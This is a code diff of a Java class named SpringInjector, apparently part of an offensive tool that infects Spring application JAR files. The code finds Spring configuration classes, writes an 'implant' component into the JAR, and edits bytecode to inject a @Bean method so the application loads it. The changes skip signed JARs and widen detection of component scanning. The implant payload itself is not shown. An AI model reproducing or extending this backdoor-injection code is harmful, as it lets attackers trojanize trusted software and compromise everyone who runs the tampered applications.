@@ -6,9 +6,12 @@ import javassist.bytecode.annotation.MemberValue;
 
 import java.io.DataInputStream;
 import java.io.IOException;
+import java.nio.file.Files;
 import java.nio.file.Path;
+import java.nio.file.StandardCopyOption;
 import java.util.*;
 import java.util.jar.JarEntry;
+import java.util.zip.ZipException;
 
 import static org.example.injector.Helpers.*;
 
@@ -24,15 +27,23 @@ public class SpringInjector {
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
         boolean didInfect = false;
         boolean foundSignedClasses = false;
+
+        if (jarLooksSigned(targetJarFilePath)) {
+            System.out.println("[-] JAR looks signed. This is not yet implemented. Aborting.");
+            // Just copy the input JAR to the output JAR to keep up with expected behaviour
+            Files.copy(targetJarFilePath, outputJar, StandardCopyOption.REPLACE_EXISTING);
+            return false;
+        }
+
         try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
             for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                 if (!entry.getName().endsWith(".class")) {
-                    entry.passOn();
+                    entry.forward();
                     continue;
                 }
                 if (entry.getEntry().getCodeSigners() != null) {
                     foundSignedClasses = true;
-                    entry.passOn();
+                    entry.forward();
                     continue;
                 }
 
@@ -40,7 +51,7 @@ public class SpringInjector {
                 try (DataInputStream in = new DataInputStream(entry.getContent())) {
                     currentlyProcessing = new ClassFile(in);
                     if (!isSpringConfigurationClass(currentlyProcessing)) {
-                        entry.passOn();
+                        entry.forward();
                         continue;
                     }
                     System.out.println("[+] Found Spring configuration: " + entry.getName());
@@ -56,7 +67,15 @@ public class SpringInjector {
                     String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
                     implantComponent.setName(targetPackageName + "." + implantComponentClassName);
                     JarEntry newJarEntry = convertToSpringJarEntry(implantComponent);
-                    implantComponent.write(fiddler.addNewEntry(newJarEntry));
+                    try {
+                        implantComponent.write(fiddler.addNewEntry(newJarEntry));
+                    } catch (ZipException e) {
+                        // QUICKFIX: The entry most likely already exist in the ZIP file
+                        System.out.println("[-] Component already exist in JAR: '" + newJarEntry + "' (skipping).");
+                        entry.forward();
+                        continue;
+                        // TODO This is _not_ a solid way of moving on. The actual class in the JAR could be something else than implantComponent.
+                    }
                     System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
 
                     if (!hasComponentScanEnabled(currentlyProcessing)) {
@@ -66,16 +85,17 @@ public class SpringInjector {
                          */
                         System.out.println("[-] Spring configuration is not set to automatically scan for components (@ComponentScan).");
 
-                        if (!addBeanToSpringConfig(currentlyProcessing, implantComponent)) {
+                        ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
+                        if (!addBeanToSpringConfig(currentlyProcessing, implantComponent, implantSpringConfig)) {
                             System.out.println("[-] Class '" + currentlyProcessing.getName() + "' already infected. Skipping.");
-                            entry.passOn();
+                            entry.forward();
                             continue;
                         }
 
-                        currentlyProcessing.write(entry.addAndGetStream());
+                        currentlyProcessing.write(entry.replaceContentByStream());
                         System.out.println("[+] Injected @Bean method into '" + currentlyProcessing.getName() + "'.");
                     } else {
-                        entry.passOn();
+                        entry.forward();
                     }
 
                     didInfect = true;
@@ -92,8 +112,7 @@ public class SpringInjector {
         return didInfect;
     }
 
-    private boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantComponent) throws IOException, ClassNotFoundException {
-        ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
+    static boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantSpringConfig, ClassFile implantComponent) throws ClassNotFoundException {
         String implantPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(implantSpringConfig.getName()));
         String targetPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(existingSpringConfig.getName()));
         String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
@@ -136,7 +155,7 @@ public class SpringInjector {
     }
 
     // Copy all annotations from implant method to target method. Notice the const pools!
-    private static void copyAllMethodAnnotations(MethodInfo target, final MethodInfo source) {
+    static void copyAllMethodAnnotations(MethodInfo target, final MethodInfo source) {
         AttributeInfo sourceAttr = source.getAttribute("RuntimeVisibleAnnotations");
         if (sourceAttr == null) {
             // The source method does not have any annotations. Is this fine?
@@ -147,6 +166,17 @@ public class SpringInjector {
         }
 
         AnnotationsAttribute targetAnnotationsAttr = new AnnotationsAttribute(target.getConstPool(), "RuntimeVisibleAnnotations");
+
+        // Retain any annotations that are already at the target method
+        AttributeInfo alreadyExistingAnnotationsAttr = target.getAttribute("RuntimeVisibleAnnotations");
+        if (alreadyExistingAnnotationsAttr != null) {
+            Annotation[] existingAnnotations = ((AnnotationsAttribute) alreadyExistingAnnotationsAttr).getAnnotations();
+            for (Annotation existingAnnotation : existingAnnotations) {
+                targetAnnotationsAttr.addAnnotation(existingAnnotation);
+            }
+        }
+
+        // Add the new annotations from the source method
         for (Annotation annotation : sourceAnnotationsAttr.getAnnotations()) {
             Annotation copiedAnnotation = new Annotation(annotation.getTypeName(), target.getConstPool());
             if (annotation.getMemberNames() != null) {
@@ -205,12 +235,17 @@ public class SpringInjector {
     }
 
     private static boolean hasComponentScanEnabled(final ClassFile springContextClassFile) {
+        Set<String> annotationsThatActivatesComponentScanning = Set.of(
+                "org.springframework.context.annotation.ComponentScan",
+                "org.springframework.boot.autoconfigure.SpringBootApplication"
+        );
+
         List<Annotation> componentScanAnnotations = springContextClassFile.getAttributes().stream()
                 .filter(attribute -> attribute instanceof AnnotationsAttribute)
                 .map(attribute -> (AnnotationsAttribute) attribute)
                 .filter(annotationAttribute -> annotationAttribute.getName().equals("RuntimeVisibleAnnotations"))
                 .flatMap(runtimeAnnotationAttribute -> Arrays.stream(runtimeAnnotationAttribute.getAnnotations())
-                        .filter(annotation -> annotation.getTypeName().equals("org.springframework.context.annotation.ComponentScan"))
+                        .filter(annotation -> annotationsThatActivatesComponentScanning.contains(annotation.getTypeName()))
                 )
                 .toList();
         return !componentScanAnnotations.isEmpty();
